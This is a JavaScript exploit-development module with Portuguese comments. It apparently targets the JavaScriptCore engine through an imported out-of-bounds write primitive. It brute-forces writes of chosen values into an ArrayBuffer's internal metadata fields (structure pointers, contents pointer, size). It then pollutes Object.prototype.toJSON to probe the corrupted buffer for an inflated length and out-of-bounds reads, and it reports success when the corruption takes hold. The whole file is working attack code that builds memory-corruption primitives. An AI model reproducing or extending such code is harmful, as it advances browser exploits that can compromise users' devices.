// js/script3/testBruteForceABMetadata.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real, // Não usado diretamente pela toJSON, mas pelo trigger
    oob_write_absolute,
    oob_read_absolute, // Não usado diretamente pela toJSON, mas pelo trigger
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// toJSON que sonda 'this' (ArrayBuffer) e tenta R/W OOB se o tamanho estiver inflado
// Esta é a v3 que se mostrou estável.
export function toJSON_AttemptWriteToThis_v3() { 
    let initial_buffer_size_for_oob_check;

    // Determina o tamanho original esperado do buffer 'this'
    if (typeof oob_array_buffer_real !== 'undefined' && this === oob_array_buffer_real) {
        // Se 'this' é o oob_array_buffer_real global, seu tamanho "original" para fins de OOB check
        // é o tamanho com o qual foi criado em triggerOOB_primitive ANTES de qualquer corrupção de tamanho neste teste.
        // Este valor é dinâmico, mas para a lógica interna da toJSON, precisamos de uma referência.
        // A forma mais segura é a toJSON não tentar inferir isso e apenas reportar o byteLength atual.
        // A lógica de "OOB" será feita pela análise do chamador.
        // Para este teste, o oob_read_attempted será baseado no byteLength atual menos um delta.
        initial_buffer_size_for_oob_check = this.byteLength; // Usar o byteLength atual para o OOB check relativo
    } else {
        initial_buffer_size_for_oob_check = 64; // Fallback para um victim_ab genérico
    }

    let result_payload = {
        toJSON_executed: "toJSON_AttemptWriteToThis_v3",
        this_type: "N/A",
        this_byteLength_prop: "N/A",
        dataview_created: false,
        internal_write_val: null,
        internal_read_val: null,
        internal_rw_match: false,
        error_in_toJSON: null,
        oob_read_offset_attempted: "N/A",
        oob_read_value_attempted: "N/A" // Renomeado para clareza
    };

    try {
        result_payload.this_type = Object.prototype.toString.call(this);
        
        try {
            result_payload.this_byteLength_prop = this.byteLength;
        } catch (e_bl) {
            result_payload.this_byteLength_prop = `Error accessing byteLength: ${e_bl.name}`;
            result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `ByteLength Access Error: ${e_bl.message}; `;
        }

        if (this instanceof ArrayBuffer) {
            let current_this_byteLength = result_payload.this_byteLength_prop;
            if (typeof current_this_byteLength !== 'number') {
                result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `Cannot proceed, this.byteLength is not a number (val: ${current_this_byteLength}).`;
                return result_payload;
            }

            if (current_this_byteLength >= 4) {
                try {
                    let dv_internal = new DataView(this, 0, Math.min(current_this_byteLength, 8));
                    result_payload.dataview_created = true;
                    
                    const val_to_write_internal = 0xABABABAB;
                    dv_internal.setUint32(0, val_to_write_internal, true);
                    result_payload.internal_write_val = toHex(val_to_write_internal);
                    
                    let read_back_internal = dv_internal.getUint32(0, true);
                    result_payload.internal_read_val = toHex(read_back_internal);
                    
                    if (read_back_internal === val_to_write_internal) {
                        result_payload.internal_rw_match = true;
                    }
                } catch (e_dv_internal) {
                    result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `Internal DataView RW Error: ${e_dv_internal.name} - ${e_dv_internal.message}; `;
                }
            } else {
                 result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `this (ArrayBuffer) too small for internal RW test (size: ${current_this_byteLength}).`;
            }

            // Tentativa de Leitura OOB relativa ao tamanho ATUAL percebido
            // Se o byteLength foi realmente inflado, tentamos ler um pouco além do que seria um tamanho "normal"
            // Vamos testar ler no que SERIA o tamanho original do oob_array_buffer_real + delta
            const original_oob_ab_total_size = OOB_CONFIG.BASE_OFFSET_IN_DV + OOB_CONFIG.ALLOCATION_SIZE + 128;
            if (current_this_byteLength > original_oob_ab_total_size) { // Só tentar OOB se o tamanho foi inflado ALÉM do original
                const oob_read_target_offset = original_oob_ab_total_size + 8; // Ler 8 bytes após o fim *original* do oob_array_buffer_real
                result_payload.oob_read_offset_attempted = toHex(oob_read_target_offset);
                try {
                    let dv_oob = new DataView(this); // Assumindo que 'this' é o buffer com tamanho potencialmente inflado
                    if (dv_oob.byteLength >= (oob_read_target_offset + 4)) {
                        result_payload.oob_read_value_attempted = toHex(dv_oob.getUint32(oob_read_target_offset, true));
                    } else {
                        result_payload.oob_read_value_attempted = `DataView (actual size ${dv_oob.byteLength}) too small for OOB read at offset ${toHex(oob_read_target_offset)}.`;
                    }
                } catch (e_oob_r) {
                     result_payload.oob_read_value_attempted = `OOB Read Error @${result_payload.oob_read_offset_attempted}: ${e_oob_r.name}`;
                }
            } else {
                 result_payload.oob_read_offset_attempted = toHex(original_oob_ab_total_size + 8);
                 result_payload.oob_read_value_attempted = `Size not inflated for OOB (this: ${current_this_byteLength}b vs original_total: ${original_oob_ab_total_size}b).`;
            }

        } else {
            result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + "this is not an ArrayBuffer.";
        }
    } catch (e_main) {
        result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `EXCEPTION_IN_toJSON: ${e_main.name} - ${e_main.message}; `;
        if (typeof result_payload.this_byteLength_prop === 'string' && result_payload.this_byteLength_prop.startsWith("Error accessing")) {
        } else {
            result_payload.this_byteLength_prop = `Error during toJSON execution: ${e_main.message}`;
        }
    }
    return result_payload;
}


export async function executeBruteForceABMetadataTest() {
    const FNAME_TEST = "executeBruteForceABMetadataTest";
    logS3(`--- Iniciando Teste: Força Bruta em Metadados de oob_array_buffer_real ---`, "test", FNAME_TEST);
    document.title = `BruteForce AB Meta`;

    const offsets_to_corrupt = [
        // Potenciais campos de JSCell / JSObject (8 bytes)
        { offset: 0x00, size: 8, description: "JSCell Header / Structure* (QWORD)" },
        { offset: 0x08, size: 8, description: "Structure* / Butterfly* (QWORD)" },
        // Potenciais campos de JSArrayBuffer (8 bytes para ponteiros, 4 ou 8 para tamanho)
        { offset: 0x10, size: 8, description: "ContentsImpl* / Butterfly* (QWORD)" },
        { offset: 0x18, size: 4, description: "Size (DWORD)" }, // Testar como DWORD
        { offset: 0x18, size: 8, description: "Size (QWORD, se aplicável)" }, // Testar como QWORD
        // Adjacentes
        { offset: 0x04, size: 4, description: "Flags / StructureID_part (DWORD)"},
        { offset: 0x0C, size: 4, description: "Adj. Structure* (DWORD)"},
        { offset: 0x14, size: 4, description: "Adj. ContentsImpl* (DWORD)"},
        { offset: 0x1C, size: 4, description: "Adj. Size (DWORD)"},
    ];

    // Valores para tentar escrever (alguns como DWORD, outros como QWORD)
    const values_to_try_dword = [
        { val: 0xFFFFFFFF, desc: "MaxUint32" },
        { val: 0x7FFFFFFF, desc: "LargePositive" },
        { val: 0x00000000, desc: "Zero" },
        { val: 0x00000001, desc: "One" },
        { val: (OOB_CONFIG.BASE_OFFSET_IN_DV + OOB_CONFIG.ALLOCATION_SIZE + 128) + 0x1000, desc: "InitialSizePlus0x1000" },
        { val: 16, desc: "SmallSize16" },
    ];
    const values_to_try_qword = [
        { val: new AdvancedInt64(0,0), desc: "NullPtr" },
        { val: new AdvancedInt64("0x4141414142424242"), desc: "DummyPtrAAAA..." },
        { val: new AdvancedInt64("0x1000"), desc: "SmallHeapPtrLike" },
    ];

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;

    for (const item of offsets_to_corrupt) {
        const current_offset = item.offset;
        const write_size = item.size;
        const values_to_attempt = (write_size === 4) ? values_to_try_dword : values_to_try_qword;

        for (const val_case of values_to_attempt) {
            const value_to_write = val_case.val;
            const test_description = `CorruptOffset_${toHex(current_offset,4)}_${write_size}B_Val_${val_case.desc}`;
            
            logS3(`\n--- Testando: ${test_description} ---`, "subtest", FNAME_TEST);
            document.title = `Test: ${toHex(current_offset)} val ${val_case.desc}`;

            await triggerOOB_primitive();
            if (!oob_array_buffer_real) {
                logS3("Falha OOB Setup. Pulando este teste.", "error", FNAME_TEST);
                continue;
            }
            const initial_oob_ab_length = oob_array_buffer_real.byteLength; // Capturar antes da corrupção
            logS3(`   oob_array_buffer_real tamanho ANTES da corrupção OOB: ${initial_oob_ab_length}`, "info", FNAME_TEST);


            logS3(`   Escrevendo ${isAdvancedInt64Object(value_to_write) ? value_to_write.toString(true) : toHex(value_to_write)} em oob_ab[${toHex(current_offset)}] (${write_size} bytes)...`, "warn", FNAME_TEST);
            try {
                if (current_offset + write_size > oob_array_buffer_real.byteLength) {
                     logS3(`   AVISO: Escrita em ${toHex(current_offset)} (tam: ${write_size}) excede o buffer. Pulando.`, "warn", FNAME_TEST);
                     clearOOBEnvironment();
                     continue;
                }
                oob_write_absolute(current_offset, value_to_write, write_size);
                logS3(`   Escrita OOB realizada.`, "info", FNAME_TEST);
            } catch (e_write) {
                logS3(`   ERRO na escrita OOB para ${test_description}: ${e_write.message}`, "error", FNAME_TEST);
                clearOOBEnvironment();
                continue; 
            }

            await PAUSE_S3(SHORT_PAUSE_S3);
            
            let stringifyResult = null;
            let errorCaptured = null;
            let potentiallyCrashed = true;

            try {
                logS3(`   Poluindo e chamando JSON.stringify(oob_array_buffer_real)...`, "info", FNAME_TEST);
                Object.defineProperty(Object.prototype, ppKey_val, {
                    value: toJSON_AttemptWriteToThis_v3,
                    writable: true, configurable: true, enumerable: false
                });
                pollutionApplied = true;

                stringifyResult = JSON.stringify(oob_array_buffer_real);
                potentiallyCrashed = false;
                logS3(`   Resultado JSON.stringify: ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "info", FNAME_TEST);

            } catch (e_stringify) {
                logS3(`   ERRO CAPTURADO JSON.stringify para ${test_description}: ${e_stringify.name} - ${e_stringify.message}`, "error", FNAME_TEST);
                errorCaptured = e_stringify;
                potentiallyCrashed = false;
            } finally {
                if (pollutionApplied) {
                    if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
                    else delete Object.prototype[ppKey_val];
                    pollutionApplied = false;
                }
            }

            if (stringifyResult && stringifyResult.toJSON_executed === "toJSON_AttemptWriteToThis_v3") {
                logS3(`   Sondagem via toJSON para ${test_description}:`, "leak", FNAME_TEST);
                logS3(`     this_byteLength_prop: ${stringifyResult.this_byteLength_prop}`, "leak", FNAME_TEST);
                logS3(`     oob_read_value_attempted: ${stringifyResult.oob_read_value_attempted}`, "leak", FNAME_TEST);
                if (stringifyResult.error_in_toJSON) {
                    logS3(`     ERRO DENTRO da toJSON: ${stringifyResult.error_in_toJSON}`, "warn", FNAME_TEST);
                }

                if (typeof stringifyResult.this_byteLength_prop === 'number' && stringifyResult.this_byteLength_prop !== initial_oob_ab_length) {
                    logS3(`   !!!! ALTERAÇÃO DE TAMANHO DETECTADA !!!! Original: ${initial_oob_ab_length}, Novo: ${stringifyResult.this_byteLength_prop}`, "critical", FNAME_TEST);
                    document.title = `SUCCESS: AB Size MODIFIED! ${toHex(current_offset)}=${val_case.desc}`;
                    if (stringifyResult.this_byteLength_prop > initial_oob_ab_length && stringifyResult.oob_read_value_attempted && !String(stringifyResult.oob_read_value_attempted).startsWith("Error") && !String(stringifyResult.oob_read_value_attempted).includes("Too small")  && !String(stringifyResult.oob_read_value_attempted).includes("not applicable")) {
                        logS3(`   !!!! LEITURA OOB EM oob_array_buffer_real BEM-SUCEDIDA !!!! Valor: ${stringifyResult.oob_read_value_attempted}`, "critical", FNAME_TEST);
                    }
                }
                 if (stringifyResult.error_in_toJSON && stringifyResult.error_in_toJSON.includes("DataView Error")) {
                    logS3(`   !!!! EFEITO DE CORRUPÇÃO DE PONTEIRO DETECTADO !!!! Erro de DataView dentro da toJSON.`, "critical", FNAME_TEST);
                    document.title = `SUCCESS: Ptr Corrupt EFFECT! ${toHex(current_offset)}=${val_case.desc}`;
                }

            } else if (errorCaptured) {
                logS3(`   Teste ${test_description} concluído com erro no stringify: ${errorCaptured.message}`, "error", FNAME_TEST);
            } else if (potentiallyCrashed) {
                logS3(`   Teste ${test_description} PODE TER CONGELADO antes da sondagem toJSON.`, "error", FNAME_TEST);
            }
            
            clearOOBEnvironment(); // Limpa para o próximo sub-teste
            await PAUSE_S3(MEDIUM_PAUSE_S3);
            if (document.title.startsWith("SUCCESS")) break; // Para se encontrar um sucesso claro
        }
        if (document.title.startsWith("SUCCESS")) break; 
    }

    logS3(`--- Teste Força Bruta em Metadados CONCLUÍDO ---`, "test", FNAME_TEST);
}
